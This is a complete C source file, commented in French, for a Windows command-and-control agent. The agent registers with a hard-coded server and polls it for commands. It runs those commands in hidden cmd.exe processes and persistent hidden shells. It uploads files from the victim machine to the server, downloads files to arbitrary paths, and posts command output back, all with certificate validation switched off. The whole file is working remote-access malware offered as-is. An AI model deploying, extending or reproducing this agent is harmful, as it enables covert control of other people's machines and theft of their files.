#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "wininet.lib")

// Configuration
#define SERVER_HOST "192.168.1.88"
#define SERVER_PORT 1234
#define AGENT_ID "agent-001"

// Flags HTTPS pour ignorer les certificats auto-signés
#define HTTPS_FLAGS (INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_RELOAD)

#define CMD_SIZE 2048
#define OUTPUT_SIZE 16384
#define DELAY_MS 3000

// ============================================================
//   Callback de validation de certificat (accepte tous les certificats)
// ============================================================
BOOL CALLBACK certificate_callback(HINTERNET hInternet, DWORD_PTR dwContext,
                                   DWORD dwInternetStatus, LPVOID lpvStatusInformation,
                                   DWORD dwStatusInformationLength) {
    if (dwInternetStatus == INTERNET_STATUS_REDIRECT) {
        printf("Redirect detected\n");
    }
    if (dwInternetStatus == INTERNET_STATUS_DETECTING_PROXY) {
        printf("Detecting proxy\n");
    }
    return TRUE;  // Accepte tout
}

// Désactiver la validation de certificat pour HTTPS
void disable_ssl_cert_validation(HINTERNET hRequest) {
    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                    SECURITY_FLAG_IGNORE_REVOCATION;
    InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
}

// ============================================================
//   STRUCTURE — Shell Interactif Persistant
// ============================================================
typedef struct {
    HANDLE hStdinRead;   // cmd.exe lit ici
    HANDLE hStdinWrite;  // on ecrit les commandes ici
    HANDLE hStdoutRead;  // on lit la sortie ici
    HANDLE hStdoutWrite; // cmd.exe ecrit ici
    PROCESS_INFORMATION pi;
    BOOL active;         // TRUE = shell ouvert
} InteractiveShell;

// Instance globale du shell interactif
InteractiveShell g_shell = {0};

// ============================================================
//   Demarre un shell interactif (shell <prog.exe>)
// ============================================================
BOOL start_interactive_shell(const char *program, char *output, size_t max_len) {
    // Si un shell est deja ouvert, on le tue d'abord
    if (g_shell.active) {
        TerminateProcess(g_shell.pi.hProcess, 0);
        CloseHandle(g_shell.pi.hProcess);
        CloseHandle(g_shell.pi.hThread);
        CloseHandle(g_shell.hStdinRead);
        CloseHandle(g_shell.hStdinWrite);
        CloseHandle(g_shell.hStdoutRead);
        CloseHandle(g_shell.hStdoutWrite);
        memset(&g_shell, 0, sizeof(g_shell));
    }

    SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};

    // Pipe STDIN  : on ecrit → cmd.exe lit
    if (!CreatePipe(&g_shell.hStdinRead, &g_shell.hStdinWrite, &sa, 0)) {
        snprintf(output, max_len, "Error: CreatePipe stdin failed");
        return FALSE;
    }
    // Le cote "write" ne doit pas etre herite
    SetHandleInformation(g_shell.hStdinWrite, HANDLE_FLAG_INHERIT, 0);

    // Pipe STDOUT : cmd.exe ecrit → on lit
    if (!CreatePipe(&g_shell.hStdoutRead, &g_shell.hStdoutWrite, &sa, 0)) {
        snprintf(output, max_len, "Error: CreatePipe stdout failed");
        CloseHandle(g_shell.hStdinRead);
        CloseHandle(g_shell.hStdinWrite);
        return FALSE;
    }
    SetHandleInformation(g_shell.hStdoutRead, HANDLE_FLAG_INHERIT, 0);

    // Configure STARTUPINFO
    STARTUPINFOA si = {0};
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput   = g_shell.hStdinRead;   // stdin  du processus
    si.hStdOutput  = g_shell.hStdoutWrite; // stdout du processus
    si.hStdError   = g_shell.hStdoutWrite; // stderr du processus
    si.wShowWindow = SW_HIDE;

    // Lance le programme (ex: "cmd.exe", "powershell.exe", "python.exe", etc.)
    char cmdline[CMD_SIZE];
    snprintf(cmdline, sizeof(cmdline), "%s", program);

    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &g_shell.pi)) {
        snprintf(output, max_len, "Error: Cannot launch '%s'", program);
        CloseHandle(g_shell.hStdinRead);
        CloseHandle(g_shell.hStdinWrite);
        CloseHandle(g_shell.hStdoutRead);
        CloseHandle(g_shell.hStdoutWrite);
        return FALSE;
    }

    // Ferme les cotes "enfant" dans le parent
    CloseHandle(g_shell.hStdoutWrite);
    CloseHandle(g_shell.hStdinRead);
    g_shell.hStdoutWrite = NULL;
    g_shell.hStdinRead   = NULL;

    g_shell.active = TRUE;

    // Petite pause pour laisser le processus demarrer
    Sleep(500);

    // Lit la banniere initiale (prompt, version, etc.)
    DWORD available = 0, read = 0;
    char banner[OUTPUT_SIZE] = {0};
    DWORD total = 0;

    Sleep(300);
    PeekNamedPipe(g_shell.hStdoutRead, NULL, 0, NULL, &available, NULL);
    if (available > 0) {
        ReadFile(g_shell.hStdoutRead, banner, min(available, OUTPUT_SIZE - 1), &read, NULL);
        banner[read] = '\0';
    }

    snprintf(output, max_len, "[+] Shell interactif ouvert: %s\n%s", program, banner);
    return TRUE;
}

// ============================================================
//   Envoie une commande au shell interactif et lit la reponse
// ============================================================
void send_to_interactive_shell(const char *cmd, char *output, size_t max_len) {
    if (!g_shell.active) {
        snprintf(output, max_len, "[-] Aucun shell interactif ouvert. Utilise: shell <programme.exe>");
        return;
    }

    // Verifie si le processus est encore vivant
    DWORD exitCode = 0;
    GetExitCodeProcess(g_shell.pi.hProcess, &exitCode);
    if (exitCode != STILL_ACTIVE) {
        g_shell.active = FALSE;
        snprintf(output, max_len, "[-] Le shell interactif s'est ferme (code: %lu)", exitCode);
        return;
    }

    // Envoie la commande + retour a la ligne
    char cmdline[CMD_SIZE];
    snprintf(cmdline, sizeof(cmdline), "%s\n", cmd);

    DWORD written = 0;
    if (!WriteFile(g_shell.hStdinWrite, cmdline, strlen(cmdline), &written, NULL)) {
        g_shell.active = FALSE;
        snprintf(output, max_len, "Error: WriteFile failed — shell mort ?");
        return;
    }

    // Attend que la sortie soit disponible (max 5 secondes)
    DWORD total = 0;
    DWORD available = 0;
    DWORD timeout = 5000;
    DWORD elapsed = 0;
    DWORD step = 100;

    while (elapsed < timeout) {
        Sleep(step);
        elapsed += step;
        PeekNamedPipe(g_shell.hStdoutRead, NULL, 0, NULL, &available, NULL);
        if (available > 0) {
            // Laisse un peu plus de temps pour que tout arrive
            Sleep(200);
            PeekNamedPipe(g_shell.hStdoutRead, NULL, 0, NULL, &available, NULL);
            break;
        }
    }

    if (available == 0) {
        snprintf(output, max_len, "(aucune sortie)");
        return;
    }

    // Lit toute la sortie disponible
    DWORD read = 0;
    while (total < max_len - 1 && available > 0) {
        DWORD toRead = min(available, max_len - total - 1);
        if (!ReadFile(g_shell.hStdoutRead, output + total, toRead, &read, NULL) || read == 0)
            break;
        total += read;

        Sleep(50);
        PeekNamedPipe(g_shell.hStdoutRead, NULL, 0, NULL, &available, NULL);
    }
    output[total] = '\0';
}

// ============================================================
//   Ferme le shell interactif
// ============================================================
void close_interactive_shell(char *output, size_t max_len) {
    if (!g_shell.active) {
        snprintf(output, max_len, "[-] Aucun shell interactif ouvert");
        return;
    }

    // Envoie "exit" pour fermeture propre
    DWORD written = 0;
    WriteFile(g_shell.hStdinWrite, "exit\n", 5, &written, NULL);
    WaitForSingleObject(g_shell.pi.hProcess, 2000);
    TerminateProcess(g_shell.pi.hProcess, 0);

    CloseHandle(g_shell.pi.hProcess);
    CloseHandle(g_shell.pi.hThread);
    CloseHandle(g_shell.hStdinWrite);
    CloseHandle(g_shell.hStdoutRead);
    memset(&g_shell, 0, sizeof(g_shell));

    snprintf(output, max_len, "[+] Shell interactif ferme");
}

// ============================================================
//   Upload un fichier vers le serveur
// ============================================================
int upload_file(const char *filepath, char *output, size_t max_len) {
    FILE *f = fopen(filepath, "rb");
    if (!f) {
        snprintf(output, max_len, "Error: Cannot open file: %s", filepath);
        return 0;
    }
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (fsize <= 0 || fsize > 100 * 1024 * 1024) {
        fclose(f);
        snprintf(output, max_len, "Error: File too large or empty");
        return 0;
    }
    char *filedata = malloc(fsize);
    if (!filedata) { fclose(f); snprintf(output, max_len, "Error: malloc failed"); return 0; }
    fread(filedata, 1, fsize, f);
    fclose(f);

    const char *filename = strrchr(filepath, '\\');
    if (!filename) filename = strrchr(filepath, '/');
    if (!filename) filename = filepath; else filename++;

    char boundary[] = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
    char url[512];
    snprintf(url, sizeof(url), "/upload?id=%s", AGENT_ID);

    size_t header_len = strlen(boundary) + strlen(filename) + 200;
    size_t total_len  = header_len + fsize + 100;
    char *body = malloc(total_len);
    if (!body) { free(filedata); snprintf(output, max_len, "Error: malloc failed"); return 0; }

    int offset = snprintf(body, total_len,
        "--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n", boundary, filename);
    memcpy(body + offset, filedata, fsize);
    offset += fsize;
    offset += snprintf(body + offset, total_len - offset, "\r\n--%s--\r\n", boundary);
    free(filedata);

    HINTERNET hSession = InternetOpenA("Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hSession) { free(body); snprintf(output, max_len, "Error: InternetOpen failed"); return 0; }
    HINTERNET hConnect = InternetConnectA(hSession, SERVER_HOST, SERVER_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) { InternetCloseHandle(hSession); free(body); snprintf(output, max_len, "Error: InternetConnect failed"); return 0; }
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", url, NULL, NULL, NULL, HTTPS_FLAGS, 0);
    if (!hRequest) { InternetCloseHandle(hConnect); InternetCloseHandle(hSession); free(body); snprintf(output, max_len, "Error: HttpOpenRequest failed"); return 0; }

    char headers[256];
    snprintf(headers, sizeof(headers), "Content-Type: multipart/form-data; boundary=%s", boundary);
    disable_ssl_cert_validation(hRequest);
    BOOL ok = HttpSendRequestA(hRequest, headers, -1, body, offset);
    free(body);

    if (ok) snprintf(output, max_len, "[+] File uploaded: %s (%ld bytes)", filename, fsize);
    else    snprintf(output, max_len, "[-] Upload failed");

    InternetCloseHandle(hRequest); InternetCloseHandle(hConnect); InternetCloseHandle(hSession);
    return ok ? 1 : 0;
}

// ============================================================
//   Download un fichier depuis le serveur
// ============================================================
int download_file(const char *filename, const char *savepath, char *output, size_t max_len) {
    char url[512];
    snprintf(url, sizeof(url), "/download/%s", filename);

    HINTERNET hSession = InternetOpenA("Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hSession) { snprintf(output, max_len, "Error: InternetOpen failed"); return 0; }
    HINTERNET hConnect = InternetConnectA(hSession, SERVER_HOST, SERVER_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) { InternetCloseHandle(hSession); snprintf(output, max_len, "Error: InternetConnect failed"); return 0; }
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", url, NULL, NULL, NULL, HTTPS_FLAGS, 0);
    if (!hRequest) { InternetCloseHandle(hConnect); InternetCloseHandle(hSession); snprintf(output, max_len, "Error: HttpOpenRequest failed"); return 0; }

    disable_ssl_cert_validation(hRequest);
    if (!HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
        InternetCloseHandle(hRequest); InternetCloseHandle(hConnect); InternetCloseHandle(hSession);
        snprintf(output, max_len, "Error: HttpSendRequest failed"); return 0;
    }

    DWORD code = 0, sz = sizeof(code);
    HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &code, &sz, NULL);
    if (code != 200) {
        InternetCloseHandle(hRequest); InternetCloseHandle(hConnect); InternetCloseHandle(hSession);
        snprintf(output, max_len, "Error: File not found (HTTP %lu)", code); return 0;
    }

    FILE *f = fopen(savepath, "wb");
    if (!f) {
        InternetCloseHandle(hRequest); InternetCloseHandle(hConnect); InternetCloseHandle(hSession);
        snprintf(output, max_len, "Error: Cannot create file: %s", savepath); return 0;
    }

    char buffer[8192];
    DWORD read = 0, total = 0;
    while (InternetReadFile(hRequest, buffer, sizeof(buffer), &read) && read > 0) {
        fwrite(buffer, 1, read, f);
        total += read;
    }
    fclose(f);
    InternetCloseHandle(hRequest); InternetCloseHandle(hConnect); InternetCloseHandle(hSession);
    snprintf(output, max_len, "[+] File downloaded: %s (%lu bytes)", savepath, total);
    return 1;
}

// ============================================================
//   eURL encode
// ============================================================
char* url_encode(const char *str) {
    if (!str) return NULL;
    size_t len = strlen(str);
    char *out = malloc(len * 3 + 1);
    if (!out) return NULL;
    char *p = out;
    for (size_t i = 0; i < len; i++) {
        unsigned char c = str[i];
        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
            (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.') {
            *p++ = c;
        } else {
            sprintf(p, "%%%02X", c);
            p += 3;
        }
    }
    *p = '\0';
    return out;
}

// ============================================================
//   HTTP POST
// ============================================================
int http_post(const char *path, const char *data) {
    HINTERNET hSession = InternetOpenA("Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hSession) return 0;
    HINTERNET hConnect = InternetConnectA(hSession, SERVER_HOST, SERVER_PORT,
                                          NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) { InternetCloseHandle(hSession); return 0; }
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path, NULL, NULL, NULL, HTTPS_FLAGS, 0);
    if (!hRequest) { InternetCloseHandle(hConnect); InternetCloseHandle(hSession); return 0; }
    const char *headers = "Content-Type: application/x-www-form-urlencoded";
    disable_ssl_cert_validation(hRequest);
    BOOL ok = HttpSendRequestA(hRequest, headers, -1, (LPVOID)data, strlen(data));
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hSession);
    return ok ? 1 : 0;
}

// ============================================================
//   HTTP GET
// ============================================================
int http_get(const char *path, char *buffer, size_t size) {
    HINTERNET hSession = InternetOpenA("Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hSession) return 0;
    HINTERNET hConnect = InternetConnectA(hSession, SERVER_HOST, SERVER_PORT,
                                          NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) { InternetCloseHandle(hSession); return 0; }
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", path, NULL, NULL,
                                          NULL, HTTPS_FLAGS, 0);
    if (!hRequest) { InternetCloseHandle(hConnect); InternetCloseHandle(hSession); return 0; }
    disable_ssl_cert_validation(hRequest);
    if (!HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
        InternetCloseHandle(hRequest); InternetCloseHandle(hConnect); InternetCloseHandle(hSession);
        return 0;
    }
    DWORD code = 0, sz = sizeof(code);
    HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &code, &sz, NULL);
    if (code == 204) {
        InternetCloseHandle(hRequest); InternetCloseHandle(hConnect); InternetCloseHandle(hSession);
        return 0;
    }
    DWORD read = 0, total = 0;
    while (total < size - 1 &&
           InternetReadFile(hRequest, buffer + total, size - total - 1, &read) && read > 0)
        total += read;
    buffer[total] = '\0';
    InternetCloseHandle(hRequest); InternetCloseHandle(hConnect); InternetCloseHandle(hSession);
    return total > 0 ? 1 : 0;
}

// ============================================================
//   Execution commande classique (one-shot via cmd.exe)
// ============================================================
void exec_cmd(const char *cmd, char *output, size_t max_len) {

    // --- shell <programme> : ouvre un shell interactif persistant ---
    if (strncmp(cmd, "shell ", 6) == 0) {
        const char *program = cmd + 6;
        while (*program == ' ') program++;
        start_interactive_shell(program, output, max_len);
        return;
    }

    // --- shell_cmd <commande> : envoie une commande au shell interactif ---
    if (strncmp(cmd, "shell_cmd ", 10) == 0) {
        const char *subcmd = cmd + 10;
        send_to_interactive_shell(subcmd, output, max_len);
        return;
    }

    // --- shell_close : ferme le shell interactif ---
    if (strcmp(cmd, "shell_close") == 0) {
        close_interactive_shell(output, max_len);
        return;
    }

    // --- upload <filepath> ---
    if (strncmp(cmd, "upload ", 7) == 0) {
        const char *filepath = cmd + 7;
        while (*filepath == ' ' || *filepath == '"') filepath++;
        char clean_path[MAX_PATH];
        strncpy(clean_path, filepath, sizeof(clean_path) - 1);
        clean_path[sizeof(clean_path) - 1] = '\0';
        size_t len = strlen(clean_path);
        while (len > 0 && (clean_path[len-1] == '"' || clean_path[len-1] == ' '))
            clean_path[--len] = '\0';
        upload_file(clean_path, output, max_len);
        return;
    }

    // --- download <filename> <savepath> ---
    if (strncmp(cmd, "download ", 9) == 0) {
        char filename[256], savepath[MAX_PATH];
        const char *args = cmd + 9;
        if (sscanf(args, "%255s %[^\n]", filename, savepath) != 2) {
            snprintf(output, max_len, "Usage: download <filename> <savepath>");
            return;
        }
        char *p = savepath;
        while (*p == ' ' || *p == '"') p++;
        memmove(savepath, p, strlen(p) + 1);
        size_t len = strlen(savepath);
        while (len > 0 && (savepath[len-1] == '"' || savepath[len-1] == ' '))
            savepath[--len] = '\0';
        download_file(filename, savepath, output, max_len);
        return;
    }

    // --- cd : persiste dans l'agent ---
    if (strncmp(cmd, "cd ", 3) == 0 || strncmp(cmd, "cd /d ", 6) == 0) {
        const char *path = (strncmp(cmd, "cd /d ", 6) == 0) ? cmd + 6 : cmd + 3;
        while (*path == ' ' || *path == '"') path++;
        char clean_path[MAX_PATH];
        strncpy(clean_path, path, sizeof(clean_path) - 1);
        clean_path[sizeof(clean_path) - 1] = '\0';
        size_t len = strlen(clean_path);
        while (len > 0 && (clean_path[len-1] == '"' || clean_path[len-1] == ' '))
            clean_path[--len] = '\0';
        if (SetCurrentDirectoryA(clean_path)) {
            char new_cwd[MAX_PATH];
            GetCurrentDirectoryA(sizeof(new_cwd), new_cwd);
            snprintf(output, max_len, "%s", new_cwd);
        } else {
            snprintf(output, max_len, "Error: Cannot access directory");
        }
        return;
    }

    // --- Commande one-shot via cmd.exe ---
    HANDLE hReadPipe, hWritePipe;
    SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        snprintf(output, max_len, "Error: CreatePipe failed");
        return;
    }
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    char cmdline[CMD_SIZE];
    snprintf(cmdline, sizeof(cmdline), "cmd.exe /C chcp 65001 >nul && %s", cmd);

    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWritePipe;
    si.hStdError  = hWritePipe;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {0};
    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        snprintf(output, max_len, "Error: CreateProcess failed");
        CloseHandle(hReadPipe); CloseHandle(hWritePipe);
        return;
    }
    CloseHandle(hWritePipe);

    DWORD read = 0, total = 0;
    while (total < max_len - 1 &&
           ReadFile(hReadPipe, output + total, max_len - total - 1, &read, NULL) && read > 0)
        total += read;
    output[total] = '\0';

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread); CloseHandle(hReadPipe);
}

// ============================================================
//   MAIN — Boucle C2
// ============================================================
int main() {
    char cmd[CMD_SIZE];
    char output[OUTPUT_SIZE];
    char cwd[MAX_PATH];
    char url[512];
    char *post_data = NULL;

    // Enregistrement
    GetCurrentDirectoryA(sizeof(cwd), cwd);
    char *enc_cwd = url_encode(cwd);
    if (enc_cwd) {
        snprintf(url, sizeof(url), "id=%s&cwd=%s", AGENT_ID, enc_cwd);
        http_post("/register", url);
        free(enc_cwd);
    }

    // Boucle principale
    while (1) {
        snprintf(url, sizeof(url), "/get_command?id=%s", AGENT_ID);

        if (http_get(url, cmd, sizeof(cmd))) {
            if (strcmp(cmd, "quit") == 0) break;

            exec_cmd(cmd, output, sizeof(output));

            GetCurrentDirectoryA(sizeof(cwd), cwd);

            char *enc_cwd2 = url_encode(cwd);
            char *enc_out  = url_encode(output);
            if (enc_cwd2 && enc_out) {
                size_t needed = strlen(AGENT_ID) + strlen(enc_cwd2) + strlen(enc_out) + 100;
                post_data = malloc(needed);
                if (post_data) {
                    snprintf(post_data, needed, "id=%s&cwd=%s&output=%s",
                             AGENT_ID, enc_cwd2, enc_out);
                    http_post("/post_result", post_data);
                    free(post_data);
                }
            }
            if (enc_cwd2) free(enc_cwd2);
            if (enc_out)  free(enc_out);
        }

        Sleep(DELAY_MS);
    }

    // Ferme le shell interactif si ouvert
    if (g_shell.active) {
        char tmp[256];
        close_interactive_shell(tmp, sizeof(tmp));
    }

    return 0;
}